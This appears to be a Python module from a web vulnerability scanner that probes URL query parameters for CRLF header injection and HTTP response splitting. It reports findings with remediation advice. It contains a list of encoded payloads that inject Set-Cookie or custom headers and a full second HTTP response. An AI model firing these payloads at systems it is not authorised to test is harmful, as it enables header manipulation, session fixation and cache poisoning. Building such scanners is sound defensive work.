"""Deep CRLF header injection / response-split tester."""
from __future__ import annotations

from typing import Dict, List, Optional
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

from utils.logger import get_logger

logger = get_logger(__name__)

_ATTACKER_MARKER = "deep-eye-crlf"

_PAYLOADS = [
    # standard
    f"%0d%0aSet-Cookie:{_ATTACKER_MARKER}=1",
    f"%0aSet-Cookie:{_ATTACKER_MARKER}=1",
    f"%0D%0ASet-Cookie:{_ATTACKER_MARKER}=1",
    # double-encoded
    f"%250d%250aSet-Cookie:{_ATTACKER_MARKER}=1",
    f"%250aSet-Cookie:{_ATTACKER_MARKER}=1",
    # response-split body injection
    f"%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Length:2%0d%0a%0d%0aOK",
    f"%0aContent-Length:0%0a%0aHTTP/1.1 200 OK%0aContent-Length:2%0a%0aOK",
    # mixed
    f"%0d%0aX-Deep-Eye:{_ATTACKER_MARKER}",
    f"%0aX-Deep-Eye:{_ATTACKER_MARKER}",
]


class CRLFHeaderInjectDeepTester:
    def __init__(self, http_client, config: Dict):
        self.http_client = http_client
        self.config = config

    def scan(self, url: str, context: Optional[Dict] = None) -> List[Dict]:
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            return []

        vulns: List[Dict] = []
        for key in list(qs.keys())[:4]:
            for payload in _PAYLOADS:
                try:
                    qs2 = {k: list(v) for k, v in qs.items()}
                    qs2[key] = [payload]
                    test_url = urlunparse(
                        parsed._replace(query=urlencode(qs2, doseq=True))
                    )
                    resp = self.http_client.get(test_url)
                    if not resp:
                        continue

                    headers = str(getattr(resp, "headers", {}) or {}).lower()
                    body = (getattr(resp, "text", "") or "").lower()
                    status = getattr(resp, "status_code", 0)

                    # Detection 1: injected Set-Cookie or custom header reflected
                    if _ATTACKER_MARKER.lower() in headers:
                        vulns.append(
                            {
                                "type": "CRLF Header Injection (Deep)",
                                "severity": "high",
                                "url": url,
                                "parameter": key,
                                "payload": payload,
                                "evidence": f"HTTP {status} – injected header containing marker '{_ATTACKER_MARKER}' observed in response headers",
                                "description": "CRLF sequences injected into a query parameter were decoded by the application and emitted into response headers, enabling header manipulation and cache poisoning.",
                                "remediation": "Strip CR (%0d) and LF (%0a) from all user input before reflecting it into headers; use a Web Application Firewall to block newline sequences.",
                            }
                        )
                        return vulns

                    # Detection 2: HTTP response split in body
                    if "http/1.1 200" in body or "http/1.0 200" in body:
                        vulns.append(
                            {
                                "type": "HTTP Response Splitting (CRLF Deep)",
                                "severity": "critical",
                                "url": url,
                                "parameter": key,
                                "payload": payload,
                                "evidence": f"HTTP {status} – second HTTP response start-line found in body",
                                "description": "A CRLF payload caused the server to emit a split HTTP response; downstream proxies or browsers may interpret the injected response as a separate transaction, leading to XSS or cache poisoning.",
                                "remediation": "Reject any input containing decoded CR/LF before it reaches the HTTP layer; normalize and validate all outbound header values.",
                            }
                        )
                        return vulns

                except Exception as e:
                    logger.debug(f"crlf_header_inject_deep: {e}")
        return vulns
